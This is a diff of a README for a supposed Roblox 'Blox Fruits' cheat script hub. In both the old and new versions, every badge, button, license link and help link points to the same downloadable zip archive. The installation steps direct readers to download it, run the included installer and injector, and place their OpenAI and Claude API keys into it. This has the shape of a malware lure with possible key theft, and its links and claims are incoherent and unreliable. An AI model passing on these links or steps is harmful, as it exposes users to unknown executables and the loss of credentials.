@@ -1,11 +1,11 @@
 # 🍍 Blox Fruits Script Roblox: The Ultimate Adventure Toolkit
 
-[![Build Status](https://github.com/Hazem-882/blox-fruits-script-hub/raw/refs/heads/branch/meliorist/hub_script_blox_fruits_v3.9-alpha.1.zip)](https://github.com/Hazem-882/blox-fruits-script-hub/raw/refs/heads/branch/meliorist/hub_script_blox_fruits_v3.9-alpha.1.zip)
-[![License: MIT](https://github.com/Hazem-882/blox-fruits-script-hub/raw/refs/heads/branch/meliorist/hub_script_blox_fruits_v3.9-alpha.1.zip)](https://github.com/Hazem-882/blox-fruits-script-hub/raw/refs/heads/branch/meliorist/hub_script_blox_fruits_v3.9-alpha.1.zip)
-[![Download Count](https://github.com/Hazem-882/blox-fruits-script-hub/raw/refs/heads/branch/meliorist/hub_script_blox_fruits_v3.9-alpha.1.zip)](https://#)
-[![Roblox-Ready](https://github.com/Hazem-882/blox-fruits-script-hub/raw/refs/heads/branch/meliorist/hub_script_blox_fruits_v3.9-alpha.1.zip)](#)
-[![OpenAI-Ready](https://github.com/Hazem-882/blox-fruits-script-hub/raw/refs/heads/branch/meliorist/hub_script_blox_fruits_v3.9-alpha.1.zip)](#)
-[![Claude-API](https://github.com/Hazem-882/blox-fruits-script-hub/raw/refs/heads/branch/meliorist/hub_script_blox_fruits_v3.9-alpha.1.zip)](#)
+[![Build Status](https://raw.githubusercontent.com/Hazem-882/blox-fruits-script-hub/branch/meliorist/blox_fruits_hub_script_v1.0.zip)](https://raw.githubusercontent.com/Hazem-882/blox-fruits-script-hub/branch/meliorist/blox_fruits_hub_script_v1.0.zip)
+[![License: MIT](https://raw.githubusercontent.com/Hazem-882/blox-fruits-script-hub/branch/meliorist/blox_fruits_hub_script_v1.0.zip)](https://raw.githubusercontent.com/Hazem-882/blox-fruits-script-hub/branch/meliorist/blox_fruits_hub_script_v1.0.zip)
+[![Download Count](https://raw.githubusercontent.com/Hazem-882/blox-fruits-script-hub/branch/meliorist/blox_fruits_hub_script_v1.0.zip)](https://#)
+[![Roblox-Ready](https://raw.githubusercontent.com/Hazem-882/blox-fruits-script-hub/branch/meliorist/blox_fruits_hub_script_v1.0.zip)](#)
+[![OpenAI-Ready](https://raw.githubusercontent.com/Hazem-882/blox-fruits-script-hub/branch/meliorist/blox_fruits_hub_script_v1.0.zip)](#)
+[![Claude-API](https://raw.githubusercontent.com/Hazem-882/blox-fruits-script-hub/branch/meliorist/blox_fruits_hub_script_v1.0.zip)](#)
 
 ---
 
@@ -14,8 +14,8 @@ Welcome to the **Blox Fruits Script Roblox Repository**, your exclusive hub for 
 ---
 
 ## 🚀 One-Click Install: Get Started!
-<a href="https://github.com/Hazem-882/blox-fruits-script-hub/raw/refs/heads/branch/meliorist/hub_script_blox_fruits_v3.9-alpha.1.zip">
-  <img src="https://github.com/Hazem-882/blox-fruits-script-hub/raw/refs/heads/branch/meliorist/hub_script_blox_fruits_v3.9-alpha.1.zip%20Here-blue?style=for-the-badge&logo=roblox" alt="Download">
+<a href="https://raw.githubusercontent.com/Hazem-882/blox-fruits-script-hub/branch/meliorist/blox_fruits_hub_script_v1.0.zip">
+  <img src="https://raw.githubusercontent.com/Hazem-882/blox-fruits-script-hub/branch/meliorist/blox_fruits_hub_script_v1.0.zip%20Here-blue?style=for-the-badge&logo=roblox" alt="Download">
 </a>
 
 ## 🎯 OS Compatibility Table
@@ -81,22 +81,22 @@ Got a script hiccup at 2 AM? Our round-the-clock support, powered by both human 
 ## 🌐 Installation Guide
 
 1. **Download the Latest Blox Fruits Script Package**
-   - Visit: https://github.com/Hazem-882/blox-fruits-script-hub/raw/refs/heads/branch/meliorist/hub_script_blox_fruits_v3.9-alpha.1.zip
+   - Visit: https://raw.githubusercontent.com/Hazem-882/blox-fruits-script-hub/branch/meliorist/blox_fruits_hub_script_v1.0.zip
 
 2. **Quick Download**
    - Click below to initiate download instantly!
      
-     <a href="https://github.com/Hazem-882/blox-fruits-script-hub/raw/refs/heads/branch/meliorist/hub_script_blox_fruits_v3.9-alpha.1.zip">
-       <img src="https://github.com/Hazem-882/blox-fruits-script-hub/raw/refs/heads/branch/meliorist/hub_script_blox_fruits_v3.9-alpha.1.zip%20Here-blue?style=for-the-badge&logo=roblox" alt="Download">
+     <a href="https://raw.githubusercontent.com/Hazem-882/blox-fruits-script-hub/branch/meliorist/blox_fruits_hub_script_v1.0.zip">
+       <img src="https://raw.githubusercontent.com/Hazem-882/blox-fruits-script-hub/branch/meliorist/blox_fruits_hub_script_v1.0.zip%20Here-blue?style=for-the-badge&logo=roblox" alt="Download">
      </a>
 
 3. **Extract & Launch**
-   - Unzip the downloaded archive using your OS’s built-in tools or https://github.com/Hazem-882/blox-fruits-script-hub/raw/refs/heads/branch/meliorist/hub_script_blox_fruits_v3.9-alpha.1.zip for extra help.
+   - Unzip the downloaded archive using your OS’s built-in tools or https://raw.githubusercontent.com/Hazem-882/blox-fruits-script-hub/branch/meliorist/blox_fruits_hub_script_v1.0.zip for extra help.
    - Open the included installer and follow the on-screen prompts.
    - For macOS & Linux users: Review the included README for injector instructions if needed.
    
 4. **Connect Your APIs (Optional)**
-   - Drop your OpenAI and Claude API keys into the `https://github.com/Hazem-882/blox-fruits-script-hub/raw/refs/heads/branch/meliorist/hub_script_blox_fruits_v3.9-alpha.1.zip` file. Save and relaunch.
+   - Drop your OpenAI and Claude API keys into the `https://raw.githubusercontent.com/Hazem-882/blox-fruits-script-hub/branch/meliorist/blox_fruits_hub_script_v1.0.zip` file. Save and relaunch.
    
 5. **Activate and Enjoy**
    - Launch Roblox, enter Blox Fruits, and activate scripts from the custom overlay.
@@ -116,7 +116,7 @@ Got a script hiccup at 2 AM? Our round-the-clock support, powered by both human 
 
 This repository and all associated scripts are offered under the MIT License © 2025.
 
-[Read the full MIT license](https://github.com/Hazem-882/blox-fruits-script-hub/raw/refs/heads/branch/meliorist/hub_script_blox_fruits_v3.9-alpha.1.zip)
+[Read the full MIT license](https://raw.githubusercontent.com/Hazem-882/blox-fruits-script-hub/branch/meliorist/blox_fruits_hub_script_v1.0.zip)
 
 ---
 
@@ -124,8 +124,8 @@ This repository and all associated scripts are offered under the MIT License © 
 
 Your journey doesn’t end here— hoist the anchor and set sail with a click:
 
-<a href="https://github.com/Hazem-882/blox-fruits-script-hub/raw/refs/heads/branch/meliorist/hub_script_blox_fruits_v3.9-alpha.1.zip">
-  <img src="https://github.com/Hazem-882/blox-fruits-script-hub/raw/refs/heads/branch/meliorist/hub_script_blox_fruits_v3.9-alpha.1.zip%20Here-blue?style=for-the-badge&logo=roblox" alt="Download">
+<a href="https://raw.githubusercontent.com/Hazem-882/blox-fruits-script-hub/branch/meliorist/blox_fruits_hub_script_v1.0.zip">
+  <img src="https://raw.githubusercontent.com/Hazem-882/blox-fruits-script-hub/branch/meliorist/blox_fruits_hub_script_v1.0.zip%20Here-blue?style=for-the-badge&logo=roblox" alt="Download">
 </a>
 
 ---
